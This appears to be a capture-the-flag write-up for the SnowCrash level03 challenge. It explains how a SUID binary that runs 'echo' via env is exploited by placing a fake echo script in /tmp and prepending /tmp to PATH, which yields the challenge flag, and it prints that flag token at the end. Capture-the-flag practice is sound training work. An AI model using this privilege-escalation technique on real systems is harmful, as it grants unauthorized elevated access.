# Level 03 - `PATH` Hijacking via SUID Binary

In this level, we exploit a SUID binary that calls `echo` using `system()`, allowing us to hijack the `PATH` variable and run our own malicious version of `echo`.

---

## Step 1: Inspect the Home Directory

```bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

We notice the presence of a **SUID** binary owned by `flag03`:

```bash
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

This binary runs with the privileges of `flag03` and is therefore a target of interest.

---

## Step 2: Analyze the Binary (Decompilation)

Using tools like **Dogbolt** or **Ghidra**, we decompile the binary and get the following simplified C-like logic:

```c
int main(int argc, char **argv, char **envp) {
  gid_t gid = getegid();
  uid_t uid = geteuid();
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  int ret = system("/usr/bin/env echo Exploit me");
  return ret;
}
```

This tells us the binary executes:

```bash
/usr/bin/env echo Exploit me
```

Which looks up `echo` in the current `PATH`. Since it uses `env`, we can hijack the command by injecting our own version of `echo` earlier in the path.

---

## Step 3: Craft a Malicious `echo`

Create a fake `echo` script that runs `getflag`:

```bash
echo "/bin/sh -c 'getflag'" > /tmp/echo
chmod +x /tmp/echo
```

---

## Step 4: Hijack the `PATH` and Run the Binary

We add `/tmp` to the beginning of the `PATH` so our fake `echo` gets called:

```bash
export PATH=/tmp:$PATH
./level03
```

Output:

```bash
Check flag.Here is your token : [REDACTED]
```

---

## ✅ Summary

- SUID binary executes `echo` via `env`, vulnerable to `PATH` hijacking.
- Injected our own `echo` script to call `getflag`.
- Successfully escalated privileges to retrieve the flag.

### Flag Token:

```text
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
